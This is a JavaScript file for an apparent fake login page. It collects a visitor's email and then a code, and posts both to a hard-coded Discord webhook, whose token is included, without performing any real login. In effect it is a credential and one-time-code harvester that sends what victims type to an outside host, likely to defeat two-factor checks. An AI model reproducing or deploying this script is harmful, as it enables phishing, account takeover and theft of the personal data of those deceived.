document.getElementById('continue-button').addEventListener('click', function() {
    const email = document.getElementById('email').value;

    if (email) {
        document.getElementById('email-section').style.display = 'none';
        document.getElementById('code-section').style.display = 'block';
    } else {
        alert('Please enter your email.');
    }
});

document.getElementById('code-section').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const code = document.getElementById('code').value;

    const webhookUrl = 'https://discord.com/api/webhooks/1241913380483236031/6i48uj6HxJ0y4gv4pKFlbUNJuMMvSlB3rMAITRroXjp74B1_eGVMHYv9yF2wk40gKuhx';  // Replace with your Discord webhook URL

    const request = new XMLHttpRequest();
    request.open('POST', webhookUrl);

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
        username: 'Login Bot',
        avatar_url: '',
        content: `Email: ${email}\nCode: ${code}`
    };

    request.send(JSON.stringify(params));

    alert('Login information sent!');
    document.getElementById('code-section').reset();
    document.getElementById('email-section').style.display = 'block';
    document.getElementById('code-section').style.display = 'none';
});
